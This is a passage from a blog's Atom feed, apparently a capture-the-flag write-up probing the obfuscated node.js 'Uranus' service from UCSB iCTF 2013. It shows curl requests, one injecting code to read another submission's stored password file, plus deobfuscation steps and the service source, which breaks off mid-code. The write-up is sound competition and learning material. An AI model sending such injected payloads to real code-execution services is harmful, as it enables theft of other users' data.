<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[M.G.]]></title>
  <link href="http://gabor.molnar.es/atom.xml" rel="self"/>
  <link href="http://gabor.molnar.es/"/>
  <updated>2013-12-14T15:58:10+01:00</updated>
  <id>http://gabor.molnar.es/</id>
  <author>
    <name><![CDATA[Gábor Molnár]]></name>
    <email><![CDATA[gabor@molnar.es]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[UCSB iCTF 2013 - The Uranus service]]></title>
    <link href="http://gabor.molnar.es/blog/2013/12/13/ucsb-ictf-2013-uranus/"/>
    <updated>2013-12-13T19:43:00+01:00</updated>
    <id>http://gabor.molnar.es/blog/2013/12/13/ucsb-ictf-2013-uranus</id>
    <content type="html"><![CDATA[<p>The uranus service of the <a href="http://ictf.cs.ucsb.edu/">UCSB iCTF</a> competition this year was an <a href="http://gabor.molnar.es/files/uranus.js">obfuscated node.js module</a>.</p>

<!-- more -->

<h2 id="initial-exploration">Initial exploration</h2>

<p>It was very easy to get it running locally (it had no external dependencies besides node.js itself) and explore the basic functionality:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>curl localhost:1337
</span><span class="line">Welcome to Uranus!
</span><span class="line">With the last update of our nuclear reactor we can now control critical variables of the process
</span><span class="line">through the easyness of JavaScript. Uranus is here to proof-check your code <span class="k">for </span>safety before
</span><span class="line">you submit it directly to the reactor.
</span><span class="line">
</span><span class="line">Use HTTP POST to submit your code.
</span><span class="line">
</span><span class="line"><span class="nv">$ </span>curl -d <span class="s1">&#39;abcd&#39;</span> localhost:1337
</span><span class="line">Your JSON is malformed. Please provide the following properties: flag_id, token, code
</span><span class="line">
</span><span class="line"><span class="nv">$ </span>curl -d <span class="s1">&#39;{&quot;flag_id&quot;: 1, &quot;token&quot;: 2, &quot;code&quot;: &quot;console.log(1234)&quot;}&#39;</span> localhost:1337
</span><span class="line">Your code is missing an access code to the nuclear reactor. Expected variable according to the
</span><span class="line">documentation is <span class="s2">&quot;password&quot;</span>.
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>When submitting this, the the ‘1234’ string appeared on the server’s stdout so it was obviously executing the submitted code. The error message says that a variable named password must be set:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>curl -d <span class="s1">&#39;{&quot;flag_id&quot;: 1, &quot;token&quot;:2, &quot;code&quot;: &quot;var password = 5&quot;}&#39;</span> localhost:1337
</span><span class="line">Your code is missing an access code to the nuclear reactor. Expected variable according to the
</span><span class="line">documentation is <span class="s2">&quot;password&quot;</span>.
</span><span class="line">
</span><span class="line"><span class="nv">$ </span>curl -d <span class="s1">&#39;{&quot;flag_id&quot;: 1, &quot;token&quot;:2, &quot;code&quot;: &quot;var password = \&quot;a\&quot;&quot;}&#39;</span> localhost:1337
</span><span class="line">Code approved. Please check your parameters carefully before deploying the code to the nuclear
</span><span class="line">reactor.
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>At this point, the service has created a file in the <code>submissions</code> directory named <code>1-2</code> containing the submitted code.</p>

<p>Since it was before the level 4 (the last few hours of the CTF) when we started working on this, we did not see any legitim traffic yet. Based on these experiments, it was clear that the legitim traffic should consist of code uploads. The exploit code gets the flag_id as a parameter. This identifies a certain uploaded code (except that we don’t know the token). The flag must be the password that was used when uploading the file.</p>

<p>Let’s try to read a file with the submitted code:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>curl -d <span class="s1">&#39;{&quot;flag_id&quot;: 2, &quot;token&quot;: 3, &quot;code&quot;: &quot;console.log(require(\&quot;fs\&quot;).readFileSync(\&quot;submissions/1-2\&quot;))&quot;}&#39;</span> localhost:1337
</span><span class="line">Your code has runtime errors: ReferenceError: require is not defined
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><code>require</code> is the function used to import modules in node.js and it was not available so it was not possible to import the filesystem module needed to manipulate files… After a few more trial, I decided to look at the source code to find a way to read files and send the content back to the exploit.</p>

<h2 id="deobfuscation">Deobfuscation</h2>

<p>The source code looked terribly obfuscated, but fortunately, the obfuscation <em>seemed</em> to be easy to revert. The obfuscated code worked like this:</p>

<ol>
  <li>Fill an array with seemingly random bytes</li>
  <li>Do some magic</li>
  <li><code>eval()</code> the resulting string</li>
</ol>

<p>Replacing the <code>eval()</code> with <code>console.log()</code> showed the deobfuscated source code. After prettifying the resulting code:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
<span class="line-number">45</span>
<span class="line-number">46</span>
<span class="line-number">47</span>
<span class="line-number">48</span>
<span class="line-number">49</span>
<span class="line-number">50</span>
<span class="line-number">51</span>
<span class="line-number">52</span>
<span class="line-number">53</span>
<span class="line-number">54</span>
<span class="line-number">55</span>
<span class="line-number">56</span>
<span class="line-number">57</span>
<span class="line-number">58</span>
<span class="line-number">59</span>
<span class="line-number">60</span>
<span class="line-number">61</span>
<span class="line-number">62</span>
<span class="line-number">63</span>
<span class="line-number">64</span>
<span class="line-number">65</span>
<span class="line-number">66</span>
<span class="line-number">67</span>
<span class="line-number">68</span>
<span class="line-number">69</span>
<span class="line-number">70</span>
<span class="line-number">71</span>
<span class="line-number">72</span>
<span class="line-number">73</span>
<span class="line-number">74</span>
<span class="line-number">75</span>
<span class="line-number">76</span>
<span class="line-number">77</span>
<span class="line-number">78</span>
<span class="line-number">79</span>
<span class="line-number">80</span>
<span class="line-number">81</span>
<span class="line-number">82</span>
<span class="line-number">83</span>
<span class="line-number">84</span>
<span class="line-number">85</span>
<span class="line-number">86</span>
<span class="line-number">87</span>
<span class="line-number">88</span>
<span class="line-number">89</span>
<span class="line-number">90</span>
<span class="line-number">91</span>
<span class="line-number">92</span>
<span class="line-number">93</span>
<span class="line-number">94</span>
<span class="line-number">95</span>
<span class="line-number">96</span>
<span class="line-number">97</span>
<span class="line-number">98</span>
<span class="line-number">99</span>
<span class="line-number">100</span>
<span class="line-number">101</span>
<span class="line-number">102</span>
<span class="line-number">103</span>
<span class="line-number">104</span>
<span class="line-number">105</span>
<span class="line-number">106</span>
<span class="line-number">107</span>
<span class="line-number">108</span>
<span class="line-number">109</span>
<span class="line-number">110</span>
<span class="line-number">111</span>
<span class="line-number">112</span>
<span class="line-number">113</span>
<span class="line-number">114</span>
<span class="line-number">115</span>
<span class="line-number">116</span>
<span class="line-number">117</span>
<span class="line-number">118</span>
<span class="line-number">119</span>
<span class="line-number">120</span>
<span class="line-number">121</span>
<span class="line-number">122</span>
<span class="line-number">123</span>
<span class="line-number">124</span>
<span class="line-number">125</span>
<span class="line-number">126</span>
<span class="line-number">127</span>
<span class="line-number">128</span>
<span class="line-number">129</span>
<span class="line-number">130</span>
<span class="line-number">131</span>
<span class="line-number">132</span>
<span class="line-number">133</span>
<span class="line-number">134</span>
<span class="line-number">135</span>
<span class="line-number">136</span>
<span class="line-number">137</span>
<span class="line-number">138</span>
<span class="line-number">139</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="kd">var</span> <span class="nx">r3A8</span> <span class="o">=</span> <span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span><span class="line">  <span class="kd">var</span> <span class="nx">U8</span> <span class="o">=</span> <span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">Z8</span><span class="p">,</span> <span class="nx">S8</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="kd">var</span> <span class="nx">D8</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nx">C8</span> <span class="o">=</span> <span class="s1">&#39;return &#39;</span><span class="p">,</span> <span class="nx">e8</span> <span class="o">=</span> <span class="p">((</span><span class="mh">0x1B2</span><span class="p">,</span> <span class="mi">95</span><span class="p">.)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">45</span><span class="p">,</span> <span class="mf">92.60E1</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">7.07E2</span><span class="p">,</span> <span class="kc">false</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">110</span><span class="p">.,</span> <span class="mf">6.2E1</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x179</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="p">(</span><span class="mi">129</span><span class="p">,</span> <span class="mf">9.4E2</span><span class="p">));</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nx">Z8</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="p">((</span><span class="mh">0x1EF</span><span class="p">,</span> <span class="mi">21</span><span class="p">.)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mf">1.18E3</span><span class="p">,</span> <span class="mi">14</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mh">0x139</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">:</span> <span class="mi">32</span><span class="p">.</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mi">23</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">1.97E2</span><span class="p">,</span> <span class="s2">&quot;R&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">6.350E2</span><span class="p">,</span> <span class="mi">97</span><span class="p">.)</span> <span class="o">&lt;=</span> <span class="mh">0x1F9</span> <span class="o">?</span> <span class="p">(</span><span class="mi">39</span><span class="p">.,</span> <span class="mi">12</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">31.3E1</span><span class="p">,</span> <span class="mh">0x1B5</span><span class="p">)))</span><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">r8</span> <span class="o">=</span> <span class="p">((</span><span class="mi">117</span><span class="p">.,</span> <span class="mi">140</span><span class="p">.)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="mh">0x18A</span><span class="p">,</span> <span class="mi">138</span><span class="p">.)</span> <span class="o">?</span> <span class="p">(</span><span class="mh">0xA9</span><span class="p">,</span> <span class="s2">&quot;z&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">17</span><span class="p">.,</span> <span class="mf">1.71E2</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="mh">0x212</span><span class="p">,</span> <span class="mi">58</span><span class="p">.)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">147.8E1</span><span class="p">,</span> <span class="mi">130</span><span class="p">)</span> <span class="o">:</span> <span class="mh">0x106</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">33</span><span class="p">.,</span> <span class="mh">0x226</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mi">26</span><span class="p">.,</span> <span class="mi">13</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x1D2</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">));</span> <span class="nx">r8</span> <span class="o">&gt;</span> <span class="p">((</span><span class="mf">54.30E1</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mf">1.5E1</span><span class="p">,</span> <span class="mf">7.390E2</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mf">38.1E1</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x1F9</span><span class="p">,</span> <span class="mh">0x133</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mf">79.10E1</span> <span class="o">?</span> <span class="p">(</span><span class="mi">68</span><span class="p">,</span> <span class="s1">&#39;\n&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">133.1E1</span><span class="p">,</span> <span class="mi">81</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x173</span> <span class="o">?</span> <span class="p">(</span><span class="mi">22</span><span class="p">.,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">1.241E3</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">));)</span><span class="nx">D8</span> <span class="o">+=</span> <span class="p">(</span><span class="nx">e8</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e8</span> <span class="o">?</span> <span class="p">((</span><span class="mi">76</span><span class="p">,</span> <span class="mh">0x167</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mf">6.2E2</span><span class="p">,</span> <span class="mf">12.93E2</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">18.0E1</span><span class="p">,</span> <span class="kc">false</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x127</span><span class="p">,</span> <span class="mf">90.80E1</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mf">1.16E2</span> <span class="o">?</span> <span class="p">(</span><span class="mf">7.96E2</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">10.93E2</span><span class="p">,</span> <span class="mf">22.8E1</span><span class="p">))</span> <span class="o">:</span> <span class="p">((</span><span class="mh">0x1F8</span><span class="p">,</span> <span class="mh">0x1FE</span><span class="p">)</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mf">30.1E1</span><span class="p">,</span> <span class="mi">124</span><span class="p">.)</span> <span class="o">?</span> <span class="p">(</span><span class="mi">31</span><span class="p">.,</span> <span class="kc">true</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">37.80E1</span><span class="p">,</span> <span class="mf">110.7E1</span><span class="p">))))</span> <span class="o">?</span> <span class="nx">Z8</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">r8</span><span class="p">)</span> <span class="o">:</span> <span class="s2">&quot;@%)eitg)(tDwn&quot;</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">r8</span><span class="o">--</span><span class="p">);</span>
</span><span class="line">    <span class="k">return</span> <span class="nx">S8</span> <span class="o">===</span> <span class="p">((</span><span class="mf">49.5E1</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">)</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mi">61</span><span class="p">,</span> <span class="mh">0x20D</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">56.6E1</span><span class="p">,</span> <span class="s2">&quot;l&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">147</span><span class="p">,</span> <span class="mi">106</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="mh">0x15</span><span class="p">,</span> <span class="mi">131</span><span class="p">.)</span> <span class="o">?</span> <span class="p">(</span><span class="mi">56</span><span class="p">,</span> <span class="kc">null</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">109</span><span class="p">.,</span> <span class="mf">95.2E1</span><span class="p">))</span> <span class="o">?</span> <span class="p">[(</span><span class="mf">145.5E1</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mf">4.11E2</span><span class="p">,</span> <span class="mh">0x1C5</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mh">0x244</span><span class="p">,</span> <span class="kc">null</span><span class="p">)</span> <span class="o">:</span> <span class="mf">14.67E2</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">119</span><span class="p">.)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">75.4E1</span><span class="p">,</span> <span class="kc">false</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x16D</span><span class="p">,</span> <span class="mi">106</span><span class="p">.)</span> <span class="o">&lt;</span> <span class="mi">12</span><span class="p">.</span> <span class="o">?</span> <span class="mh">0x222</span> <span class="o">:</span> <span class="p">(</span><span class="mf">8.64E2</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">))].</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="nx">C8</span> <span class="o">+</span> <span class="nx">D8</span><span class="p">)()</span> <span class="o">:</span> <span class="nx">S8</span> <span class="o">^</span> <span class="nx">Z8</span>
</span><span class="line">  <span class="p">})(</span><span class="s2">&quot;_9(mTe.)ea e(&quot;</span><span class="p">,</span> <span class="p">((</span><span class="mh">0x127</span><span class="p">,</span> <span class="mh">0x216</span><span class="p">)</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mf">130.6E1</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">2.36E2</span><span class="p">,</span> <span class="kc">null</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">62</span><span class="p">.,</span> <span class="mi">142</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mh">0x251</span><span class="p">,</span> <span class="mi">72</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">128.0E1</span><span class="p">,</span> <span class="s1">&#39;R&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x19</span><span class="p">,</span> <span class="mf">90.30E1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">21</span><span class="p">.</span> <span class="o">?</span> <span class="p">(</span><span class="mi">127</span><span class="p">,</span> <span class="mf">9.5E2</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span> <span class="mf">9.540E2</span><span class="p">)));</span>
</span><span class="line">  <span class="k">return</span> <span class="p">{</span><span class="nx">J8</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">H8</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="kd">var</span> <span class="nx">g8</span><span class="p">,</span> <span class="nx">R8</span> <span class="o">=</span> <span class="p">((</span><span class="mf">1.414E3</span><span class="p">,</span> <span class="mi">117</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">70</span><span class="p">.</span> <span class="o">?</span> <span class="p">(</span><span class="mf">12.0E1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">73.5E1</span><span class="p">,</span> <span class="mf">147.70E1</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mf">2.5E1</span> <span class="o">?</span> <span class="p">(</span><span class="mf">1.3980E3</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">53</span><span class="p">,</span> <span class="mf">98.2E1</span><span class="p">)),</span> <span class="nx">W8</span> <span class="o">=</span> <span class="p">((</span><span class="mf">44.6E1</span><span class="p">,</span> <span class="mf">130.20E1</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x133</span> <span class="o">?</span> <span class="p">(</span><span class="mf">24.6E1</span><span class="p">,</span> <span class="mh">0x142CF49F580</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">12.9E1</span><span class="p">,</span> <span class="mi">10</span><span class="p">.)</span> <span class="o">&gt;=</span> <span class="mi">133</span><span class="p">.</span> <span class="o">?</span> <span class="p">(</span><span class="mi">107</span><span class="p">.,</span> <span class="mh">0x193</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x240</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">))</span> <span class="o">&gt;</span> <span class="nx">U8</span><span class="p">,</span> <span class="nx">G8</span><span class="p">;</span>
</span><span class="line">    <span class="k">for</span> <span class="p">(;</span> <span class="nx">R8</span> <span class="o">&lt;</span> <span class="nx">H8</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">R8</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">      <span class="nx">G8</span> <span class="o">=</span> <span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">H8</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">R8</span><span class="p">),</span> <span class="mi">16</span><span class="p">)).</span><span class="nx">toString</span><span class="p">((</span><span class="mi">14</span><span class="p">.</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x21D</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mh">0x155</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">42.40E1</span><span class="p">,</span> <span class="mi">141</span><span class="p">.)</span> <span class="o">&lt;=</span> <span class="mi">76</span><span class="p">.</span> <span class="o">?</span> <span class="p">(</span><span class="mf">3.25E2</span><span class="p">,</span> <span class="mi">42</span><span class="p">)</span> <span class="o">:</span> <span class="mi">132</span><span class="p">.</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mh">0x62</span><span class="p">,</span> <span class="mf">11.99E2</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">94.10E1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x8B</span><span class="p">,</span> <span class="mi">34</span><span class="p">)));</span>
</span><span class="line">      <span class="nx">g8</span> <span class="o">=</span> <span class="nx">R8</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">?</span> <span class="nx">G8</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">G8</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">:</span> <span class="nx">g8</span> <span class="o">^</span> <span class="nx">G8</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">G8</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line">    <span class="k">return</span> <span class="nx">g8</span> <span class="o">?</span> <span class="nx">W8</span> <span class="o">:</span> <span class="o">!</span><span class="nx">W8</span>
</span><span class="line">  <span class="p">}};</span>
</span><span class="line"><span class="p">})();</span>
</span><span class="line"><span class="kd">var</span> <span class="nx">z9o2</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;63&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="p">{</span><span class="s1">&#39;p2&#39;</span><span class="o">:</span> <span class="s2">&quot;length&quot;</span><span class="p">,</span> <span class="s1">&#39;n2&#39;</span><span class="o">:</span> <span class="s2">&quot;fs&quot;</span><span class="p">,</span> <span class="s1">&#39;w4&#39;</span><span class="o">:</span> <span class="s2">&quot;toString&quot;</span><span class="p">,</span> <span class="s1">&#39;J4&#39;</span><span class="o">:</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="s1">&#39;v2&#39;</span><span class="o">:</span> <span class="s2">&quot;listen&quot;</span><span class="p">,</span> <span class="s1">&#39;R4&#39;</span><span class="o">:</span> <span class="s2">&quot;log&quot;</span><span class="p">,</span> <span class="s1">&#39;a4&#39;</span><span class="o">:</span> <span class="s1">&#39;uncaughtException&#39;</span><span class="p">,</span> <span class="s1">&#39;d2&#39;</span><span class="o">:</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="s1">&#39;c4&#39;</span><span class="o">:</span> <span class="s1">&#39;Server running at http://0.0.0.0:1337/&#39;</span><span class="p">,</span> <span class="s1">&#39;Q4&#39;</span><span class="o">:</span> <span class="s2">&quot;http&quot;</span><span class="p">,</span> <span class="s1">&#39;N4&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span><span class="p">,</span> <span class="s1">&#39;W4&#39;</span><span class="o">:</span> <span class="s2">&quot;createServer&quot;</span><span class="p">,</span> <span class="s1">&#39;Q2&#39;</span><span class="o">:</span> <span class="p">{},</span> <span class="s1">&#39;M4&#39;</span><span class="o">:</span> <span class="mi">1337</span><span class="p">,</span> <span class="s1">&#39;t2&#39;</span><span class="o">:</span> <span class="s2">&quot;on&quot;</span><span class="p">,</span> <span class="s1">&#39;s4&#39;</span><span class="o">:</span> <span class="s2">&quot;submissions&quot;</span><span class="p">,</span> <span class="s1">&#39;x2&#39;</span><span class="o">:</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="s1">&#39;y2&#39;</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;X2&#39;</span><span class="o">:</span> <span class="mi">200</span><span class="p">,</span> <span class="s1">&#39;f2&#39;</span><span class="o">:</span> <span class="s2">&quot;end&quot;</span><span class="p">,</span> <span class="s1">&#39;l2&#39;</span><span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s1">&#39;A4&#39;</span><span class="o">:</span> <span class="s2">&quot;writeHead&quot;</span><span class="p">}</span> <span class="o">:</span> <span class="mi">1337</span><span class="p">;</span>
</span><span class="line"><span class="kd">function</span> <span class="nx">handle</span><span class="p">(</span><span class="nx">E</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;aa2e&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;You suck\n&#39;</span> <span class="o">:</span> <span class="s1">&#39;Welcome to Uranus!\nWith the last update of our nuclear reactor we can now control critical variables of the process through the easyness of JavaScript. Uranus is here to proof-check your code for safety before you submit it directly to the reactor. \n\nUse HTTP POST to submit your code.&#39;</span><span class="p">,</span> <span class="nx">V</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;f56&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;test&quot;</span> <span class="o">:</span> <span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;a6cf&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;indexOf&quot;</span> <span class="o">:</span> <span class="s2">&quot;l&quot;</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;5613&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;method&quot;</span> <span class="o">:</span> <span class="s2">&quot;writeFileSync&quot;</span><span class="p">;</span>
</span><span class="line">  <span class="k">if</span> <span class="p">(</span><span class="nx">E</span><span class="p">[</span><span class="nx">c</span><span class="p">][</span><span class="nx">s</span><span class="p">](</span><span class="nx">V</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">y2</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="nx">handlePOST</span><span class="p">(</span><span class="nx">E</span><span class="p">,</span> <span class="nx">b</span><span class="p">);</span>
</span><span class="line">    <span class="k">return</span><span class="p">;</span>
</span><span class="line">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
